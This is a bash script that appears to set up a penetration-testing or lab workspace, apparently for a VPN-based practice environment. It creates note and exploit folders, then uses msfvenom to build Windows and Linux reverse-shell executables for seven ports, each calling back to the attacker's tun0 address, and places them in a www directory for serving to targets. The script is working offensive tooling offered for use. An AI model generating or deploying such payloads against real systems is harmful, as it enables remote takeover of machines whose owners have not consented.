#!/bin/bash

# create folder structure
mkdir -p exploits www notes logs artefacts
echo "[+] All folders created."

# create files
printf "# project\n\n## exploitation path\n- one\n- two\n\n## notes\n\n## ideas\n- [ ] one\n- [ ] two\n\n## nmap" >> notes/index.md
touch hosts.txt
printf "#!/bin/bash\nexport IP=X.X.X.X\nexport ME=X.X.X.X" > envars.sh && chmod +x envars.sh

echo "[+] www/index.md created."

# create payloads
LHOST="tun0"
PORTS=(80 443 4444 5555 6666 7777 8888)
PAYLOAD_WIN="windows/x64/shell/reverse_tcp"
PAYLOAD_LIN="linux/x64/shell_reverse_tcp "
for PORT in "${PORTS[@]}"; do
    OUTPUT_WIN="www/rs_${PORT}.exe"
    OUTPUT_LIN="www/rs_${PORT}"
    echo "[*] Creating payload $PAYLOAD_WIN for port $PORT: $OUTPUT_WIN"
    msfvenom -p $PAYLOAD_WIN LHOST=$LHOST LPORT=$PORT -f exe -o $OUTPUT_WIN
    chmod +x $OUTPUT_WIN
    echo "[*] Creating payload $PAYLOAD_LIN for port $PORT: $OUTPUT_LIN"
    msfvenom -p $PAYLOAD_LIN LHOST=$LHOST LPORT=$PORT -f elf -o $OUTPUT_LIN
    chmod +x $OUTPUT_LIN
done
echo "[+] All payloads created in 'www/' directory."
